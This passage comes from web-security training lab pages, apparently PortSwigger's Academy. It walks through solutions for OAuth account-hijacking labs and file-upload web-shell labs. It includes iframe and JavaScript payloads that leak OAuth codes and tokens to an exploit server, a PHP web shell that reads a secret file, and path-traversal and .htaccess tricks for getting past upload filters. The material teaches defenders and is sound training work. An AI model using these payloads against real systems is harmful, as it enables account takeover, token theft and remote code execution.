        client_id
       </code>
                                    with the new one you just copied. Send this request. Observe that the response
                                    contains the sensitive metadata for the OAuth provider's cloud environment,
                                    including the secret access key.
                                </li>
                                <li>
                                    Use the "Submit solution" button to submit the access key and solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Forced OAuth profile linking
                (oauth)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab gives you the option to attach a social media profile to your account so that you can log in
                via
                <a href="https://portswigger.net/web-security/oauth">
                    OAuth
                </a>
                instead of using the normal username and password. Due to the insecure implementation of the OAuth flow
                by the client application, an attacker can manipulate this functionality to obtain access to other
                users' accounts.
            </p>
            <p>
                To solve the lab, use a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to attach your own social media profile to the admin user's account on the blog website, then access the
                admin panel and delete
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                The admin user will open anything you send from the exploit server and they always have an active
                session on the blog website.
            </p>
            <p>
                You can log in to your own accounts using the following credentials:
            </p>
            <ul>
                <li>
                    Blog website account:
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    Social media profile:
                    <code>
    peter.wiener:hotdog
   </code>
                </li>
            </ul>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/6277e415ef43d61680e72e8facbeceacf6e3e4957f85c443470fa06ad977b666?referrer=%2fweb-security%2foauth%2flab-oauth-forced-oauth-profile-linking"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, click "My account". You are taken to a normal
                                    login page, but notice that there is an option to log in using your social media
                                    profile instead. For now, just log in to the blog website directly using the classic
                                    login form.
                                </li>
                                <li>
                                    Notice that you have the option to attach your social media profile to your existing
                                    account.
                                </li>
                                <li>
                                    Click "Attach a social profile". You are redirected to the social media website,
                                    where you should log in using your social media credentials to complete the OAuth
                                    flow. Afterwards, you will be redirected back to the blog website.
                                </li>
                                <li>
                                    Log out and then click "My account" to go back to the login page. This time, choose
                                    the "Log in with social media" option. Observe that you are logged in instantly via
                                    your newly linked social media account.
                                </li>
                                <li>
                                    In the proxy history, study the series of requests for attaching a social profile.
                                    In the
                                    <code>
        GET /auth?client_id[...]
       </code>
                                    request, observe that the
                                    <code>
        redirect_uri
       </code>
                                    for this functionality sends the authorization code to
                                    <code>
        /oauth-linking
       </code>
                                    . Importantly, notice that the request does not include a
                                    <code>
        state
       </code>
                                    parameter to protect against CSRF attacks.
                                </li>
                                <li>
                                    Turn on proxy interception and select the "Attach a social profile" option again.
                                </li>
                                <li>
                                    Go to Burp Proxy and forward any requests until you have intercepted the one for
                                    <code>
        GET /oauth-linking?code=[...]
       </code>
                                    . Right-click on this request and select "Copy URL".
                                </li>
                                <li>
                                    Drop the request. This is important to ensure that the code is not used and,
                                    therefore, remains valid.
                                </li>
                                <li>
                                    Turn off proxy interception and log out of the blog website.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and create an
                                        <code>
         iframe
        </code>
                                        in which the
                                        <code>
         src
        </code>
                                        attribute points to the URL you just copied. The result should look something
                                        like this:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Deliver the exploit to the victim. When their browser loads the
                                    <code>
        iframe
       </code>
                                    , it will complete the OAuth flow using your social media profile, attaching it to
                                    the admin account on the blog website.
                                </li>
                                <li>
                                    Go back to the blog website and select the "Log in with social media" option again.
                                    Observe that you are instantly logged in as the admin user. Go to the admin panel
                                    and delete
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: OAuth account hijacking via redirect_uri
                (oauth)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses an
                <a href="https://portswigger.net/web-security/oauth">
                    OAuth
                </a>
                service to allow users to log in with their social media account. A misconfiguration by the OAuth
                provider makes it possible for an attacker to steal authorization codes associated with other users'
                accounts.
            </p>
            <p>
                To solve the lab, steal an authorization code associated with the admin user, then use it to access
                their account and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                The admin user will open anything you send from the exploit server and they always have an active
                session with the OAuth service.
            </p>
            <p>
                You can log in with your own social media account using the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/8df8965d53d202be54b51a34cae42dca0806945f7ef11146e8a1905bf9f71f6b?referrer=%2fweb-security%2foauth%2flab-oauth-account-hijacking-via-redirect-uri"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, click "My account" and complete the OAuth login
                                    process. Afterwards, you will be redirected back to the blog website.
                                </li>
                                <li>
                                    Log out and then log back in again. Observe that you are logged in instantly this
                                    time. As you still had an active session with the OAuth service, you didn't need to
                                    enter your credentials again to authenticate yourself.
                                </li>
                                <li>
                                    In Burp, study the OAuth flow in the proxy history and identify the
                                    <strong>
                                        most recent
                                    </strong>
                                    authorization request. This should start with
                                    <code>
        GET /auth?client_id=[...]
       </code>
                                    . Notice that when this request is sent, you are immediately redirected to the
                                    <code>
        redirect_uri
       </code>
                                    along with the authorization code in the query string. Send this authorization
                                    request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, observe that you can submit any arbitrary value as the
                                    <code>
        redirect_uri
       </code>
                                    without encountering an error. Notice that your input is used to generate the
                                    redirect in the response.
                                </li>
                                <li>
                                    Change the
                                    <code>
        redirect_uri
       </code>
                                    to point to the exploit server, then send the request and follow the redirect. Go to
                                    the exploit server's access log and observe that there is a log entry containing an
                                    authorization code. This confirms that you can leak authorization codes to an
                                    external domain.
                                </li>
                                <li>
                                    <p>
                                        Go back to the exploit server and create the following
                                        <code>
         iframe
        </code>
                                        at
                                        <code>
         /exploit
        </code>
                                        :
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Store the exploit and click "View exploit". Check that your
                                    <code>
        iframe
       </code>
                                    loads and then check the exploit server's access log. If everything is working
                                    correctly, you should see another request with a leaked code.
                                </li>
                                <li>
                                    Deliver the exploit to the victim, then go back to the access log and copy the
                                    victim's code from the resulting request.
                                </li>
                                <li>
                                    <p>
                                        Log out of the blog website and then use the stolen code to navigate to:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
       </code>
                                    <p>
                                        The rest of the OAuth flow will be completed automatically and you will be
                                        logged in as the admin user. Open the admin panel and delete
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Stealing OAuth access tokens via an open redirect
                (oauth)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses an
                <a href="https://portswigger.net/web-security/oauth">
                    OAuth
                </a>
                service to allow users to log in with their social media account. Flawed validation by the OAuth service
                makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
            </p>
            <p>
                To solve the lab, identify an open redirect on the blog website and use this to steal an access token
                for the admin user's account. Use the access token to obtain the admin's API key and submit the solution
                using the button provided in the lab banner.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    You cannot access the admin's API key by simply logging in to their account on the client
                    application.
                </p>
            </div>
            <p>
                The admin user will open anything you send from the exploit server and they always have an active
                session with the OAuth service.
            </p>
            <p>
                You can log in via your own social media account using the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/59fa9eb2f6bea4ef7b1872b98ff18e315d1981de5fae4917388f9942c98d8682?referrer=%2fweb-security%2foauth%2flab-oauth-stealing-oauth-access-tokens-via-an-open-redirect"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, click "My account" and complete the OAuth login
                                    process. Afterwards, you will be redirected back to the blog website.
                                </li>
                                <li>
                                    Study the resulting requests and responses. Notice that the blog website makes an
                                    API call to the userinfo endpoint at
                                    <code>
        /me
       </code>
                                    and then uses the data it fetches to log the user in. Send the
                                    <code>
        GET /me
       </code>
                                    request to Burp Repeater.
                                </li>
                                <li>
                                    Log out of your account and log back in again. From the proxy history, find the most
                                    recent
                                    <code>
        GET /auth?client_id=[...]
       </code>
                                    request and send it to Repeater.
                                </li>
                                <li>
                                    In Repeater, experiment with the
                                    <code>
        GET /auth?client_id=[...]
       </code>
                                    request. Observe that you cannot supply an external domain as
                                    <code>
        redirect_uri
       </code>
                                    because it's being validated against a whitelist. However, you can append additional
                                    characters to the default value without encountering an error, including the
                                    <code>
        /../
       </code>
                                    <a href="https://portswigger.net/web-security/file-path-traversal">
                                        path traversal
                                    </a>
                                    sequence.
                                </li>
                                <li>
                                    Log out of your account on the blog website and turn on proxy interception in Burp.
                                </li>
                                <li>
                                    In the browser, log in again and go to the intercepted
                                    <code>
        GET /auth?client_id=[...]
       </code>
                                    request in Burp Proxy.
                                </li>
                                <li>
                                    <p>
                                        Confirm that the
                                        <code>
         redirect_uri
        </code>
                                        parameter is in fact vulnerable to
                                        <a href="https://portswigger.net/web-security/file-path-traversal">
                                            directory traversal
                                        </a>
                                        by changing it to:
                                    </p>
                                    <code class="code-scrollable">
        https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
       </code>
                                    <p>
                                        Forward any remaining requests and observe that you are eventually redirected to
                                        the first blog post. In the browser, notice that your access token is included
                                        in the URL as a fragment.
                                    </p>
                                </li>
                                <li>
                                    With the help of Burp, audit the other pages on the blog website. Identify the "Next
                                    post" option at the bottom of each blog post, which works by redirecting users to
                                    the path specified in a query parameter. Send the corresponding
                                    <code>
        GET /post/next?path=[...]
       </code>
                                    request to Repeater.
                                </li>
                                <li>
                                    In Repeater, experiment with the
                                    <code>
        path
       </code>
                                    parameter. Notice that this is an open redirect. You can even supply an absolute URL
                                    to elicit a redirect to a completely different domain, for example, your exploit
                                    server.
                                </li>
                                <li>
                                    <p>
                                        Craft a malicious URL that combines these vulnerabilities. You need a URL that
                                        will initiate an OAuth flow with the
                                        <code>
         redirect_uri
        </code>
                                        pointing to the open redirect, which subsequently forwards the victim to your
                                        exploit server:
                                    </p>
                                    <code class="code-scrollable">
        https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email
       </code>
                                </li>
                                <li>
                                    Test that this URL works correctly by visiting it in the browser. You should be
                                    redirected to the exploit server's "Hello, world!" page, along with the access token
                                    in a URL fragment.
                                </li>
                                <li>
                                    <p>
                                        On the exploit server, create a suitable script at
                                        <code>
         /exploit
        </code>
                                        that will extract the fragment and output it somewhere. For example, the
                                        following script will leak it via the access log by redirecting users to the
                                        exploit server for a second time, with the access token as a query parameter
                                        instead:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
window.location = '/?'+document.location.hash.substr(1)
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    To test that everything is working correctly, store this exploit and visit your
                                    malicious URL again in the browser. Then, go to the exploit server access log. There
                                    should be a request for
                                    <code>
        GET /?access_token=[...]
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        You now need to create an exploit that first forces the victim to visit your
                                        malicious URL and then executes the script you just tested to steal their access
                                        token. For example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    To test that the exploit works, store it and then click "View exploit". The page
                                    should appear to refresh, but if you check the access log, you should see a new
                                    request for
                                    <code>
        GET /?access_token=[...]
       </code>
                                    .
                                </li>
                                <li>
                                    Deliver the exploit to the victim, then copy their access token from the log.
                                </li>
                                <li>
                                    In Repeater, go to the
                                    <code>
        GET /me
       </code>
                                    request and replace the token in the
                                    <code>
        Authorization: Bearer
       </code>
                                    header with the one you just copied. Send the request. Observe that you have
                                    successfully made an API call to fetch the victim's data, including their API key.
                                </li>
                                <li>
                                    Use the "Submit solution" button at the top of the lab page to submit the stolen key
                                    and solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Remote code execution via web shell upload
                (file-upload)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerable image upload function. It doesn't perform any validation on the files
                users upload before storing them on the server's filesystem.
            </p>
            <p>
                To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file
                <code>
   /home/carlos/secret
  </code>
                . Submit this secret using the button provided in the lab banner.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/535975a13e89837c0707c5ccec5d576e69540e338e9aee215d9bf8b0323a8919?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-remote-code-execution-via-web-shell-upload"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, log in to your account and notice the option
                                    for uploading an avatar image.
                                </li>
                                <li>
                                    Upload an arbitrary image, then return to your account page. Notice that a preview
                                    of your avatar is now displayed on the page.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    . Click the filter bar to open the
                                    <strong>
                                        Filter settings
                                    </strong>
                                    dialog. Under
                                    <strong>
                                        Filter by MIME type
                                    </strong>
                                    , enable the
                                    <strong>
                                        Images
                                    </strong>
                                    checkbox, then apply your changes.
                                </li>
                                <li>
                                    In the proxy history, notice that your image was fetched using a
                                    <code>
        GET
       </code>
                                    request to
                                    <code>
        /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        On your system, create a file called
                                        <code>
         exploit.php
        </code>
                                        , containing a script for fetching the contents of Carlos's secret file. For
                                        example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
       </code>
                                </li>
                                <li>
                                    Use the avatar upload function to upload your malicious PHP file. The message in the
                                    response confirms that this was uploaded successfully.
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the path of the request to point to your PHP file:
                                    </p>
                                    <code class="code-scrollable">
        GET /files/avatars/exploit.php HTTP/1.1
       </code>
                                </li>
                                <li>
                                    Send the request. Notice that the server has executed your script and returned its
                                    output (Carlos's secret) in the response.
                                </li>
                                <li>
                                    Submit the secret to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web shell upload via Content-Type restriction bypass
                (file-upload)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerable image upload function. It attempts to prevent users from uploading
                unexpected file types, but relies on checking user-controllable input to verify this.
            </p>
            <p>
                To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file
                <code>
   /home/carlos/secret
  </code>
                . Submit this secret using the button provided in the lab banner.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/dfd0cce82acda8dae507a0fa7a1fb76029163a80e9b1889113d91a885337e9dd?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-content-type-restriction-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and upload an image as your avatar, then go back to your account page.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    and notice that your image was fetched using a
                                    <code>
        GET
       </code>
                                    request to
                                    <code>
        /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        On your system, create a file called
                                        <code>
         exploit.php
        </code>
                                        , containing a script for fetching the contents of Carlos's secret. For example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
       </code>
                                </li>
                                <li>
                                    Attempt to upload this script as your avatar. The response indicates that you are
                                    only allowed to upload files with the MIME type
                                    <code>
        image/jpeg
       </code>
                                    or
                                    <code>
        image/png
       </code>
                                    .
                                </li>
                                <li>
                                    In Burp, go back to the proxy history and find the
                                    <code>
        POST /my-account/avatar
       </code>
                                    request that was used to submit the file upload. Send this to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, go to the tab containing the
                                    <code>
        POST /my-account/avatar
       </code>
                                    request. In the part of the message body related to your file, change the specified
                                    <code>
        Content-Type
       </code>
                                    to
                                    <code>
        image/jpeg
       </code>
                                    .
                                </li>
                                <li>
                                    Send the request. Observe that the response indicates that your file was
                                    successfully uploaded.
                                </li>
                                <li>
                                    Switch to the other Repeater tab containing the
                                    <code>
        GET /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    request. In the path, replace the name of your image file with
                                    <code>
        exploit.php
       </code>
                                    and send the request. Observe that Carlos's secret was returned in the response.
                                </li>
                                <li>
                                    Submit the secret to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web shell upload via
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                (file-upload)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerable image upload function. The server is configured to prevent execution of
                user-supplied files, but this restriction can be bypassed by exploiting a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    secondary vulnerability
                </a>
                .
            </p>
            <p>
                To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file
                <code>
   /home/carlos/secret
  </code>
                . Submit this secret using the button provided in the lab banner.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/e39b4571e65ad58013bb6cf68240e2e7e59d087bfb1d58dd8673116f4bdf7135?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-path-traversal"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and upload an image as your avatar, then go back to your account page.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    and notice that your image was fetched using a
                                    <code>
        GET
       </code>
                                    request to
                                    <code>
        /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        On your system, create a file called
                                        <code>
         exploit.php
        </code>
                                        , containing a script for fetching the contents of Carlos's secret. For example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
       </code>
                                </li>
                                <li>
                                    Upload this script as your avatar. Notice that the website doesn't seem to prevent
                                    you from uploading PHP files.
                                </li>
                                <li>
                                    In Burp Repeater, go to the tab containing the
                                    <code>
        GET /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    request. In the path, replace the name of your image file with
                                    <code>
        exploit.php
       </code>
                                    and send the request. Observe that instead of executing the script and returning the
                                    output, the server has just returned the contents of the PHP file as plain text.
                                </li>
                                <li>
                                    In Burp's proxy history, find the
                                    <code>
        POST /my-account/avatar
       </code>
                                    request that was used to submit the file upload and send it to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, go to the tab containing the
                                        <code>
         POST /my-account/avatar
        </code>
                                        request and find the part of the request body that relates to your PHP file. In
                                        the
                                        <code>
         Content-Disposition
        </code>
                                        header, change the
                                        <code>
         filename
        </code>
                                        to include a
                                        <a href="https://portswigger.net/web-security/file-path-traversal">
                                            directory traversal
                                        </a>
                                        sequence:
                                    </p>
                                    <code class="code-scrollable">
        Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
       </code>
                                </li>
                                <li>
                                    Send the request. Notice that the response says
                                    <code>
        The file avatars/exploit.php has been uploaded.
       </code>
                                    This suggests that the server is stripping the directory traversal sequence from the
                                    file name.
                                </li>
                                <li>
                                    <p>
                                        Obfuscate the directory traversal sequence by URL encoding the forward slash (
                                        <code>
         /
        </code>
                                        ) character, resulting in:
                                    </p>
                                    <code class="code-scrollable">
        filename="..%2fexploit.php"
       </code>
                                </li>
                                <li>
                                    Send the request and observe that the message now says
                                    <code>
        The file avatars/../exploit.php has been uploaded.
       </code>
                                    This indicates that the file name is being URL decoded by the server.
                                </li>
                                <li>
                                    In the browser, go back to your account page.
                                </li>
                                <li>
                                    In Burp's proxy history, find the
                                    <code>
        GET /files/avatars/..%2fexploit.php
       </code>
                                    request. Observe that Carlos's secret was returned in the response. This indicates
                                    that the file was uploaded to a higher directory in the filesystem hierarchy (
                                    <code>
        /files
       </code>
                                    ), and subsequently executed by the server. Note that this means you can also
                                    request this file using
                                    <code>
        GET /files/exploit.php
       </code>
                                    .
                                </li>
                                <li>
                                    Submit the secret to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web shell upload via extension blacklist bypass
                (file-upload)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this
                defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
            </p>
            <p>
                To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file
                <code>
   /home/carlos/secret
  </code>
                . Submit this secret using the button provided in the lab banner.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You need to upload two different files to solve this lab.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/23b377e90a4c2eb083ef9f02cb4800e763796995a1449f85714790d15c30b9fa?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-extension-blacklist-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and upload an image as your avatar, then go back to your account page.
                                </li>
                                <li>
                                    In Burp, go to
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    and notice that your image was fetched using a
                                    <code>
        GET
       </code>
                                    request to
                                    <code>
        /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        On your system, create a file called
                                        <code>
         exploit.php
        </code>
                                        containing a script for fetching the contents of Carlos's secret. For example:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
       </code>
                                </li>
                                <li>
                                    Attempt to upload this script as your avatar. The response indicates that you are
                                    not allowed to upload files with a
                                    <code>
        .php
       </code>
                                    extension.
                                </li>
                                <li>
                                    In Burp's proxy history, find the
                                    <code>
        POST /my-account/avatar
       </code>
                                    request that was used to submit the file upload. In the response, notice that the
                                    headers reveal that you're talking to an Apache server. Send this request to Burp
                                    Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, go to the tab for the
                                    <code>
        POST /my-account/avatar
       </code>
                                    request and find the part of the body that relates to your PHP file. Make the
                                    following changes:
                                    <ul>
                                        <li>
                                            Change the value of the
                                            <code>
          filename
         </code>
                                            parameter to
                                            <code>
          .htaccess
         </code>
                                            .
                                        </li>
                                        <li>
                                            Change the value of the
                                            <code>
          Content-Type
         </code>
                                            header to
                                            <code>
          text/plain
         </code>
                                            .
                                        </li>
                                        <li>
                                            <p>
                                                Replace the contents of the file (your PHP payload) with the following
                                                Apache directive:
                                            </p>
                                            <code class="code-scrollable">
          AddType application/x-httpd-php .l33t
         </code>
                                            <p>
                                                This maps an arbitrary extension (
                                                <code>
           .l33t
          </code>
                                                ) to the executable MIME type
                                                <code>
           application/x-httpd-php
          </code>
                                                . As the server uses the
                                                <code>
           mod_php
          </code>
                                                module, it knows how to handle this already.
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Send the request and observe that the file was successfully uploaded.
                                </li>
                                <li>
                                    Use the back arrow in Burp Repeater to return to the original request for uploading
                                    your PHP exploit.
                                </li>
                                <li>
                                    Change the value of the
                                    <code>
        filename
       </code>
                                    parameter from
                                    <code>
        exploit.php
       </code>
                                    to
                                    <code>
        exploit.l33t
       </code>
                                    . Send the request again and notice that the file was uploaded successfully.
                                </li>
                                <li>
                                    Switch to the other Repeater tab containing the
                                    <code>
        GET /files/avatars/&lt;YOUR-IMAGE&gt;
       </code>
                                    request. In the path, replace the name of your image file with
                                    <code>
        exploit.l33t
       </code>
